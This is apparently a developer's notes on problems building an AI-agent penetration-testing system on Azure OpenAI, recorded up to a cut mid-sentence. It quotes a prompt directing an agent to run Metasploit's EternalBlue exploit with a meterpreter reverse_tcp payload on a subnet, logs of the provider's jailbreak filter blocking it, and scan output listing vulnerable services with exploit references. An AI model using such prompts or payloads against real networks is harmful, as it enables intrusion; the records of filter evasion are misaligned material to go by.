1. faced issue due to content being filtered as dangerous by azure openai content management policy. example payload/prompt: Perform Metasploit exploit on target 192.168.100.0/24 with exploit exploit/windows/smb/ms17_010_eternalblue and options PAYLOAD windows/meterpreter/reverse_tcp LHOST=192.168.100.1 using the function registered . Return 'TERMINATE' when complete.
e.g. (openai.BadRequestError: Error code: 400 - {'error': {'message': "The response was filtered due to the prompt triggering Azure OpenAI's content management policy. Please modify your prompt and retry. To learn more about our content filtering policies please read our documentation: https://go.microsoft.com/fwlink/?linkid=2198766", 'type': None, 'param': 'prompt', 'code': 'content_filter', 'status': 400, 'innererror': {'code': 'ResponsibleAIPolicyViolation', 'content_filter_result': {'hate': {'filtered': False, 'severity': 'safe'}, 'jailbreak': {'filtered': True, 'detected': True}, 'self_harm': {'filtered': False, 'severity': 'safe'}, 'sexual': {'filtered': False, 'severity': 'safe'}, 'violence': {'filtered': False, 'severity': 'safe'}}}}})
second example while performing exploitation:
Start the exploit assessment on target network: 192.168.100.55 using the data {'PORT_22_SSH': [{'VULNERABILITIES': {10.0: [('95499236-C9FE-56A6-9D7D-E943A24B633A', 10.0, 'https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A'), ('2C119FFA-ECE0-5E14-A4A4-354A2C38071A', 10.0, 'https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A')], 8.1: [('5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A', 8.1, 'https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A')], 7.8: [('PACKETSTORM:140070', 7.8, 'https://vulners.com/packetstorm/PACKETSTORM:140070'), ('EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09', 7.8, 'https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09'), ('CVE-2015-8325', 7.8, 'https://vulners.com/cve/CVE-2015-8325'), ('1337DAY-ID-26494', 7.8, 'https://vulners.com/zdt/1337DAY-ID-26494')], 7.5: [('EDB-ID:40888', 7.5, 'https://vulners.com/exploitdb/EDB-ID:40888')], 5.9: [('EDB-ID:40136', 5.9, 'https://vulners.com/exploitdb/EDB-ID:40136'), ('EDB-ID:40113', 5.9, 'https://vulners.com/exploitdb/EDB-ID:40113'), ('CVE-2016-6210', 5.9, 'https://vulners.com/cve/CVE-2016-6210')], 5.3: [('PACKETSTORM:181223', 5.3, 'https://vulners.com/packetstorm/PACKETSTORM:181223')], 4.3: [('EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF', 4.3, 'https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF'), ('EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF', 4.3, 'https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF'), ('1337DAY-ID-25440', 4.3, 'https://vulners.com/zdt/1337DAY-ID-25440'), ('1337DAY-ID-25438', 4.3, 'https://vulners.com/zdt/1337DAY-ID-25438')]}}], 'PORT_80_HTTP': [{'PORT_80_HTTP_DOMBASED_XSS': "Couldn't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS."}, {'PORT_80_HTTP_ENUM': "| http-enum:\n|   /test.php: Test page\n|   /icons/: Potentially interesting directory w/ listing on 'apache/1.3.20'\n|   /manual/: Potentially interesting directory w/ listing on 'apache/1.3.20'\n|_  /usage/: Potentially interesting folder"}, {'PORT_80_HTTP_SERVER_HEADER': '|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b'}, {'PORT_80_HTTP_STORED_XSS': "|_http-stored-xss: Couldn't find any stored XSS vulnerabilities."}, {'PORT_80_HTTP_TRACE': '|_http-trace: TRACE is enabled'}], 'PORT_139_NETBIOS': [], 'PORT_443_HTTPS': [{'PORT_80_HTTP_SERVER_HEADER': '|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b'}, {'PORT_80_CSS_INJECTION': '| ssl-ccs-injection:\n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.\n|\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\n|       http://www.openssl.org/news/secadv_20140605.txt\n|_      http://www.cvedetails.com/cve/2014-0224'}, {'PORT_443_SSL_POODLE': '| ssl-poodle:\n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the "POODLE" issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA\n|     References:\n|       https://www.securityfocus.com/bid/70574\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n|       https://www.openssl.org/~bodo/ssl-poodle.pdf\n|_      https://www.imperialviolet.org/2014/10/14/poodle.html'}]}.
--------------------------------------------------------------------------------
Next speaker: exploit_agent
2024-12-23 16:54:58,331 - INFO - HTTP Request: POST https://bcuoaibot.openai.azure.com//openai/deployments/gpt-4o/chat/completions?api-version=2024-02-01 "HTTP/1.1 400 model_error"
openai.BadRequestError: Error code: 400 - {'error': {'message': "The response was filtered due to the prompt triggering Azure OpenAI's content management policy. Please modify your prompt and retry. To learn more about our content filtering policies please read our documentation: https://go.microsoft.com/fwlink/?linkid=2198766", 'type': None, 'param': 'prompt', 'code': 'content_filter', 'status': 400, 'innererror': {'code': 'ResponsibleAIPolicyViolation', 'content_filter_result': {'hate': {'filtered': False, 'severity': 'safe'}, 'jailbreak': {'filtered': True, 'detected': True}, 'self_harm': {'filtered': False, 'severity': 'safe'}, 'sexual': {'filtered': False, 'severity': 'safe'}, 'violence': {'filtered': False, 'severity': 'safe'}}}}}
python-BaseException
2. Connection issue sometimes due to faulty configurations like one time I tried adding configuration as the function input into the agent but instead of pointing to that problem, I was getting "connection error".
3. Can't process everything in one go as the context window is short when more data is fed into the agent i.e. when you try to pass the nmap resutls directly to the agent. Same goes for the when more devices are on your network.
3.1. First we tried to handle this by using the message transform to limit the context handled in group chat to contain only 2 previous messages. That as well was not enough to handle the context overshoot.
3.2. Secondly, we decided to adopt hybrid approach to including the data saving and cleaning into the system so that the context window issue can be resolved. For that purpose we first save the results when finding the vulnerabilities in the system based on the timestamp, target address, so that later the latest results can be fetched for each ip. Then we created a series of data cleaning that include the data division based on the port, then for each port, find the different type of useful information from the data and subgroup it on the same port. If any vulnerabilities are found, they are then rearranged into order based on the cvss score and kept only the meaningful information skipping any below the threshold which in our case is 4.0. The saved results are fetched from the